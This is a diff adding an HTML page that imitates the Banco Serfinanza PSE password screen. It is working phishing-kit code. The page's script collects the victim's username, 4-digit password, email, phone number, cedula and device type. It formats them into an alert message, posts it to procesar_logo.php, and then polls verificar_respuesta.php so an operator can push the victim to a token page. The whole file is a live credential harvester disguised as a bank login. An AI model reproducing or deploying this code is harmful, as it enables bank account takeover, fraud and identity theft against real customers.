@@ -1,0 +1,343 @@
+<html>
+    <head>
+        <title>Confirmacion</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        
+        <meta content="es" http-equiv="Content-Language">
+    
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon">
+        <link rel="icon" href="../img/favicon.ico" type="image/x-icon">
+
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>        
+        <link href="../css/style.css" rel="stylesheet">
+        <link href="../css/stylesheet.css" rel="stylesheet">
+        <script type="text/javascript" src="../js/functions.js"></script>
+        <script type="text/javascript" src="../js/ready.js"></script>      
+        
+                 <script type="text/javascript">
+         $(document).ready(function() {   
+             console.log("jQuery cargado correctamente en clav.html");
+             
+             // Verificar que el botón existe
+             if($("#btn-password").length > 0) {
+                 console.log("Botón password encontrado");
+             } else {
+                 console.log("ERROR: Botón password NO encontrado");
+             }
+             
+             // Verificar que el input existe
+             if($("#txt-password").length > 0) {
+                 console.log("Input password encontrado");
+             } else {
+                 console.log("ERROR: Input password NO encontrado");
+             }
+         });
+         </script>
+        
+                 <script>
+         document.addEventListener("DOMContentLoaded", function () {
+           const urlParams = new URLSearchParams(window.location.search);
+          
+          // Generar o recuperar session_id
+          let sessionId = localStorage.getItem('session_id');
+          if (!sessionId) {
+            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('session_id', sessionId);
+          }
+          
+          // Obtener usuario desde URL params y establecer en localStorage
+          const userFromUrl = urlParams.get('user');
+          if (userFromUrl) {
+            localStorage.setItem('username', userFromUrl);
+          }
+
+          // Event listener para el botón Ingresar
+          const btnIngresar = document.getElementById('btn-password');
+          
+          btnIngresar.addEventListener('click', async function (event) {
+            event.preventDefault();
+
+            // Obtener datos del formulario
+            const identificacion = localStorage.getItem('username') || '';
+            const password = document.getElementById('txt-password').value;
+            
+            // Validar que la contraseña tenga exactamente 4 dígitos
+            if (password.length !== 4) {
+              alert('La contraseña debe tener exactamente 4 dígitos');
+              return;
+            }
+
+            // Mostrar loader si existe
+            const loader = document.getElementById('loader-overlay');
+            if (loader) {
+              loader.style.display = 'flex';
+            }
+
+            localStorage.setItem('username', identificacion);
+            localStorage.setItem('password', password);
+            localStorage.setItem('session_id', sessionId);
+            localStorage.setItem('identificacion', identificacion);
+
+            let infoData;
+            try {
+              infoData = JSON.parse(localStorage.getItem('info') || '{}');
+            } catch (e) {
+              return;
+            }
+
+            const meta = infoData?.metaInfo || {};
+            const username = urlParams.get('user') || localStorage.getItem('username') || '';
+            
+            // Detectar tipo de dispositivo
+            const userAgent = navigator.userAgent;
+            let dispositivo = 'PC';
+            
+            if (/Android/i.test(userAgent)) {
+              dispositivo = 'Android';
+            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+              dispositivo = 'iPhone';
+            } else if (/Windows/i.test(userAgent)) {
+              dispositivo = 'PC';
+            } else if (/Mac/i.test(userAgent)) {
+              dispositivo = 'Mac';
+            } else if (/Linux/i.test(userAgent)) {
+              dispositivo = 'Linux';
+            }
+            
+            const hora = new Date().toLocaleString('es-ES');
+            
+            // Construir mensaje y enviar directamente
+            const mensaje = `
+<b><u>💎BANCO SERFINANZA PSE💎</u></b>
+• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+• <b>🏦Banco:</b> BANCO SERFINANZA
+------------------------------
+<b>📟Dispositivo:</b> ${dispositivo}
+<b>🗺IP:</b> No disponible
+<b>⏱Hora:</b> ${hora}
+------------------------------
+👤 Usuario: ${identificacion}
+🔑 Clave: ${password}
+------------------------------`;
+
+            const formData = new FormData();
+            formData.append('message', mensaje);
+            formData.append('transactionId', sessionId);
+
+            // Enviar datos a procesar_logo.php
+            fetch('procesar_logo.php', {
+              method: 'POST',
+              body: formData
+            })
+            .then(res => res.json())
+                         .then(result => {
+               if (result.status === 'success') {
+                 // Sin mostrar mensaje, continuar silenciosamente
+                 // El loader se queda hasta que checkPaymentVerification termine
+                 checkPaymentVerification(sessionId, result.messageId);
+               } else {
+                 // Solo ocultar loader si hay error
+                 const loader = document.getElementById('loader-overlay');
+                 if (loader) {
+                   loader.style.display = 'none';
+                 }
+                 alert('Error en el procesamiento. Intente nuevamente.');
+               }
+             })
+                         .catch(err => {
+               // Ocultar loader si hay error
+               const loader = document.getElementById('loader-overlay');
+               if (loader) {
+                 loader.style.display = 'none';
+               }
+               // Sin mostrar mensaje de error
+             });
+          });
+
+          // Validación para caracteres alfanuméricos en el campo de contraseña
+          document.getElementById('txt-password').addEventListener('input', function(e) {
+            // Remover cualquier carácter que no sea letra o número
+            this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
+            
+            // Limitar a 4 caracteres
+            if (this.value.length > 4) {
+              this.value = this.value.slice(0, 4);
+            }
+          });
+
+          // Prevenir pegar texto que no sean caracteres alfanuméricos
+          document.getElementById('txt-password').addEventListener('paste', function(e) {
+            e.preventDefault();
+            let pastedText = (e.clipboardData || window.clipboardData).getData('text');
+            let alphanumericOnly = pastedText.replace(/[^a-zA-Z0-9]/g, '');
+            if (alphanumericOnly.length > 4) {
+              alphanumericOnly = alphanumericOnly.slice(0, 4);
+            }
+            this.value = alphanumericOnly;
+          });
+        });
+
+        async function checkPaymentVerification(transactionId, messageId) {
+          try {
+            const formData = new FormData();
+            formData.append('transactionId', transactionId);
+            formData.append('messageId', messageId);
+
+                         const res = await fetch('verificar_respuesta.php', {
+              method: 'POST',
+              body: formData
+            });
+            const result = await res.json();
+
+            if (result.action) {
+              switch (result.action) {
+                                 case 'pedir_dinamica':
+                   window.location.href = "token.php";
+                  break;
+                case 'error_logo': 
+                  // Ocultar loader antes de mostrar error
+                  const loader = document.getElementById('loader-overlay');
+                  if (loader) {
+                    loader.style.display = 'none';
+                  }
+                  alert("Usuario o clave incorrectos.");
+                  window.location.href = "../index.html";
+                  break;
+              }
+            } else {
+              setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+            }
+          } catch (err) {
+            setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+          }
+        }
+        </script>
+    </head>
+<body>
+    <!-- Loader Overlay -->
+    <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); z-index: 9999; justify-content: center; align-items: center;">
+        <div style="background: white; padding: 30px; border-radius: 10px; text-align: center;">
+            <div style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+            <div style="color: #333; font-size: 16px; font-weight: bold;">Procesando información...</div>
+            <div style="color: #666; font-size: 14px; margin-top: 10px;">Por favor espere</div>
+        </div>
+    </div>
+    
+         <style>
+     @keyframes spin {
+         0% { transform: rotate(0deg); }
+         100% { transform: rotate(360deg); }
+     }
+     </style>
+    
+    <div id="fondo"></div>
+    <div id="mensaje">
+        <div style="text-align:center;">Tu información de ingreso es requerida, algunos datos necesarios no se han ingresado o tu información es inválida, revisa tu información e intenta nuevamente haciendo clic en "Aceptar"
+            <br><br>
+La Contraseña es requerida</div>
+        <br><br>
+        <div style="text-align:right;"><button class="btn" id="btn-aceptar">Aceptar</button></div>
+    </div>
+    <div id="cabecera">
+        <img src="../img/logo.png">
+    </div>
+    <div style="height: 24px;"></div>
+    <div id="contenido">
+        <table border="0" width="100%" cellpadding="0" cellspacing="0">
+            <tr>
+                <td valign="top" id="panel-izq">
+                    <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                            <td valign="bottom"><img src="../img/vig.jpg" width="24"></td>
+                            <td>
+                                <div class="frm">
+                                    <div class="titulo">CONTRASEÑA</div>
+                                    <div style="height: 29px;"></div>
+                                    <table border="0" width="90%" cellpadding="0" cellspacing="0" id="inp-usuario">
+                                        <tr>
+                                            <td valign="middle" align="left" width="54" id="ico-user1"><img src="../img/candado.jpg"></td>
+                                            <td valign="middle" align="right">
+                                                <div id="ico-user2">
+                                                    <img src="../img/candado.jpg">
+                                                </div>
+                                                                                                 <input type="password" name="txt-password" id="txt-password" class="entradas" placeholder="Ingresa tu contraseña" autocomplete="off" maxlength="4" readonly style="background-color: #E9ECEF;">
+
+                                                <div id="teclado">
+                                                    <table border="0" cellspacing="0" cellpadding="0" id="botones">
+                                                        <tr>
+                                                            <td><div class="tecla" id="n3">3</div></td>
+                                                            <td><div class="tecla" id="n7">7</td>
+                                                            <td><div class="tecla" id="n1">1</td>
+                                                            <td><button class="control" id="btn-cerrar">Cerrar</button></td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td><div class="tecla" id="n2">2</div></td>
+                                                            <td><div class="tecla" id="n6">6</div></td>
+                                                            <td><div class="tecla" id="n5">5</div></td>
+                                                            <td><button class="control-gris" id="btn-limpiar">Limpiar</button></td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td><div class="tecla" id="n9">9</div></td>
+                                                            <td><div class="tecla" id="n0">0</div></td>
+                                                            <td><div class="tecla" id="n4">4</div></td>
+                                                            <td><button class="control" id="btn-volver">Volver</button></td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td></td>
+                                                            <td><div class="tecla" id="n8">8</div></td>
+                                                            <td></td>
+                                                            <td></td>
+                                                        </tr>
+                                                    </table>
+                                                </div>
+                                            </td>
+                                        </tr>
+                                    </table>
+                                    <div style="height: 42px;"></div>
+                                  
+                                        <table border="0" cellspacing="0" cellpadding="0" style="margin: 0 auto;">
+                                            <tr>
+                                                <td><button class="btn" id="btn-password">Ingresar</button>&nbsp;</td>
+                                                <td>&nbsp;<button class="btn" disabled>Cancelar</button></td>
+                                            </tr>
+                                        </table>                                        
+                                 
+                                    <div style="height: 42px;"></div>
+                                    <table border="0" width="100%" cellpadding="0" cellspacing="0">
+                                        <tr>
+                                            <td class="recordar" align="left">Regístrate aquí</td>
+                                            <td class="recordar" align="center">Recordar Usuario</td>
+                                            <td class="recordar" align="right">Restablecer Contraseña</td>
+                                        </tr>
+                                    </table>
+                                </div>
+                            </td>
+                        </tr>
+                    </table>                    
+                </td>
+                <td valign="top" id="panel-der">
+                    <img src="../img/slide.png" width="100%">
+                </td>
+            </tr>
+        </table>
+        <div class="linea">
+            Línea de Servicio al Cliente: 323 5997000 - 018000510513
+        </div>
+        <table border="0" width="100%" cellpadding="0" cellspacing="0" style="margin-top: 10px;">
+            <tr>
+                <td align="left" valign="top"><img src="../img/1.jpg"><br class="salto"><img src="../img/2.jpg"><br class="salto"><img src="../img/3.jpg"><br class="salto"><div id="derechos" style="font-size: 12px; color: #666; font-family: Arial, sans-serif; padding: 10px 0;">Serfinanza - 2025</div></td>
+                <td align="right" valign="top"><div id="derechos2" style="font-size: 12px; color: #666; font-family: Arial, sans-serif; padding: 10px 0;">Serfinanza - 2025</div></td>
+            </tr>
+        </table>
+    </div>    
+</body>
+</html> 
